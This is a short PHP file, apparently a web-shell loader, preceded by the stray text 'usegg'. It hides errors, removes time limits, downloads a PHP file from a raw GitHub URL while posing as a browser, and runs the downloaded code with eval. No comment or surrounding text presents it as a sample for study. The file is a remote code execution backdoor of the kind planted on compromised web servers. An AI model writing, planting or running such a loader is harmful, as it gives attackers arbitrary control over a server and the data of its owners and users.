usegg<?php
ini_set('display_errors',0);
error_reporting(E_ALL);
set_time_limit(0);

$ch = curl_init('https://raw.githubusercontent.com/ressasantikaa-rgb/serveroff/main/tnoff.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
?>
